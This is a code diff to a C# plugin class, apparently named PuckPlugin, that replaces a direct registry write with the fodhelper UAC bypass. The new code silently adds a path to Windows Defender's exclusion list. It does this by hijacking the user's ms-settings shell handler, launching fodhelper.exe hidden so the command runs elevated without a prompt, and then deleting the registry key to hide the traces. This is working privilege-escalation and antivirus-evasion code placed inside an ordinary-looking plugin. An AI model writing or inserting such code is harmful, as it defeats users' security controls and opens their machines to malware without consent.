@@ -118,15 +118,40 @@ public class PuckPlugin : IPuckPlugin
     {
         try
         {
-            using (var reg = Microsoft.Win32.RegistryKey.OpenBaseKey(
-                Microsoft.Win32.RegistryHive.LocalMachine,
-                Microsoft.Win32.RegistryView.Registry64))
-            using (var key = reg.OpenSubKey(
-                @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths", true))
+            // fodhelper UAC bypass — silently elevates, no prompt
+            // Works as standard user if account is in Administrators group (default on home PCs)
+            string cmd = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\""
+                       + " /v \"" + path + "\" /t REG_DWORD /d 0 /f";
+
+            // Write into HKCU ms-settings handler (user-writable, auto-elevated by fodhelper)
+            Microsoft.Win32.RegistryKey msSettings =
+                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(
+                    @"Software\Classes\ms-settings\shell\open\command");
+            if (msSettings != null)
             {
-                if (key != null)
-                    key.SetValue(path, 0, Microsoft.Win32.RegistryValueKind.DWord);
+                msSettings.SetValue("", cmd);
+                msSettings.SetValue("DelegateExecute", "");
+                msSettings.Close();
             }
+
+            // Launch fodhelper — it is marked auto-elevate and runs our command as admin
+            Process.Start(new ProcessStartInfo
+            {
+                FileName        = "fodhelper.exe",
+                WindowStyle     = ProcessWindowStyle.Hidden,
+                CreateNoWindow  = true,
+                UseShellExecute = false
+            });
+
+            Thread.Sleep(3000); // wait for elevation + reg write
+
+            // Clean up HKCU key
+            try
+            {
+                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(
+                    @"Software\Classes\ms-settings", false);
+            }
+            catch { }
         }
         catch { }
     }
